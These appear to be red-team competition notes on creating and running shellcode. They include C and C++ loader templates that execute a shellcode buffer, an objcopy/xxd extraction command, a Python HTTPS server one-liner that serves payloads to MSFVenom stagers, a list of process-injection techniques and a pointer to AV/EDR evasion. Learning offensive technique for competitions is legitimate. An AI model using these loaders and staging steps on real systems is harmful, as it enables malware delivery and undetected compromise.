# Shellcode Creation
## Linux

Generating shellcode for a Linux operating system: Tips.

>[!note]
>When generating MSFVenom shellcode to be executed by a stager, use the `raw` format, as the shellcode will be downloaded directly into memory.

```shell
# Copy and save executable code as c-string. (Useful to convert slivers to shellcode, etc. when not using B64 or similar)

objcopy -j .text -O binary <compiled executable> <text section to save to (still bin)>
xxd -i <text section> 
```

```c
// Example code for Linux direct execution

#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        <shellcode goes here>
    };
    
    (*(void(*)())message)();
    return 0;
}
```

## Windows

Generating shellcode for a Windows operating system: Tips

```cpp
// Example code for Windows direct execution

#include <windows.h>
char stager[] = {
	<shellcode goes here> 
};
int main()
{
    DWORD oldProtect;
    VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
    int (*shellcode)() = (int(*)())(void*)stager;
    shellcode();
}
```

# Shellcode Injection Techniques
- Direct Injection
- Process Hollowing
- Thread Injection
- DLL Injection
Reference THM for example code. Most of these techniques are out of scope for competitions. 

# Staged Payloads
We can generate staged payloads with [[MSFVenom]]. 

This means we are going to have to serve the payload ourselves as well. This example shows an HTTPS stage listener. 
```shell
# Spin up an HTTPS server for serving our shellcode to the stager

openssl req -new -x509 -keyout <certificate outfile> -out <same outfile as before> -days 365 -nodes

python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='<certificate we just generated>',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

An example C# stager can be found here: https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs. However, you should be able to perform HTTPS requests in your language of preference to fetch the raw shellcode yourself. 

>[!danger] Detection Risk
>Shellcode is inherently risky. Use the tactics described in [[Evasion]] to help your code avoid detection by AV/EDR/XDR.

>[!note]
>Sliver and Meterpreter have built-in stagers that both use the same protocol, therefore you may use [[MSFVenom]]-generated stagers to retrieve slivers with a sliver stage-listener. 
 